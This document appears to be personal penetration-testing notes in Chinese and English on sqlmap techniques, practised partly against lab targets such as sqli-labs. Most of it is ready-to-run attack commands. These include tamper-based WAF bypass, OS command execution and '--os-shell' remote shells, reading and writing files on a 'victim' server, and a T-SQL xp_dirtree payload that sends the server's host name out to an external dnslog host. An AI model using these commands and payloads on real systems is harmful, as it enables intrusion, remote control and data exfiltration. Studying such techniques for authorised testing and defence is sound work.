# sqlmap tricks 


## level and risk in detail
**blue---> level **
**red---> risk **
![[Pasted image 20211210155402.png]]


## 手工指定注入点


问题：

For example, `http://127.0.0.1/index.php?id=10-1` displays the content of `id=9`.
id=10-1，但是会被识别为9 .

解决方案：
` http://mysite.com/test.php?id=*10-1`

参考链接：
https://security.stackexchange.com/questions/178771/sqlmap-injection-point


## 指定user-agent
sqlmap默认是特定的user-agent，有的网站会拦截
加 --user-agent=???指定user-agent




## 过waf / 技巧性sql注入

### 宽字节注入使用sqlmap

手注过程/原理： https://segmentfault.com/a/1190000020772218

sqlmap 

列出可用的tamper，会列出可用tamper和简单说明。

```shell
sqlmap --list-tampers
```

![[Pasted image 20211211120655.png]]

tamper应用例:

宽字节注入 sqli lesson 32
```shell
sqlmap -u "http://192.168.50.11/Less-32/?id=1" --tamper=unmagicquotes.py --dbs --tables
```



利用proxy,burp抓sqlmap的包

burp加代理  ![[Pasted image 20211211124228.png]] 

```shell
sqlmap -u "http://192.168.50.42/06/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -p name --proxy=http://192.168.50.31:1111 --dbms mysql
```

burp抓到包：
![[Pasted image 20211211124252.png]]
也可以使用ip代理池 ```--proxy-file```

过相应waf从网上找或者自己写相应tamper即可。


## sqlmap命令执行
注：比较少见而且限制很多。
一般需要current user是dba权限时才能发挥作用

### 执行一条os command
``` --os-cmd=OSCMD```
例：
```shell
sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --os-cmd="ipconfig"
```

![[Pasted image 20211211173904.png]]

### get shell
```--os-shell```
例：
```shell
sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --os-shell
```
![[Pasted image 20211211174101.png]]


## 读入/写入文件

### 读入
例：
```shell
sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --file-read="C:/Windows/System32/inetsrv/MetaBase.xml" --threads=10
```
使用前提： 有足够权限 + 知道要读取的文件在受害机上的路径
![[Pasted image 20211211182937.png]]

### 写入（往受害机写入）
例：
```shell
sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --file-write D:\1.txt --file-dest C:\Hws.com\HwsHostMaster\wwwroot\dm1.com\web\1.txt

```

使用前提： 有足够权限 + 提供正确读/写路径

## sqlmap dnslog注入

1. 需要找到注入点
2. 调取sql-shell      
3. 准备dnslog服务器
4. 构造payload
5. 查看dnslog服务器，得到想要结果


1,2 ---> 
```shell 
sqlmap -u "http://www.dm1.com/inj.aspx?id=1" --sql-shell
```

![[Pasted image 20211211185004.png]]

3 --->  ```jho7xh.dnslog.cn``` ![[Pasted image 20211211185047.png]]

4 ---> 

```shell

declare @s varchar(5000),@host varchar(5000) set @s=(host_name()) set @host=CONVERT(varchar(5000),@s)+'.jho7xh.dnslog.cn';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"')

```

5 --->  
![[Pasted image 20211211185437.png]]
得到了host_name() : 12SERVER5

命令前半段是拼接字符串， 没什么好说的
后半段
```shell
EXEC('master..xp_dirtree "\\'+@host+'\foobar$"')
```

```master..xp_dirtree```是读取后面目录下的所有文件。 而用在dnslog的sql injection上面，因为会发出请求，dnslog就会留下记录，从而得到想要信息。

参考链接： https://www.acunetix.com/blog/articles/blind-out-of-band-sql-injection-vulnerability-testing-added-acumonitor/



## sqlmap dns注入

https://www.wangan.com/articles/1179

还有一种方法理论上可以使用burp插件，但是实践未成功(sqlmap dns collaborator)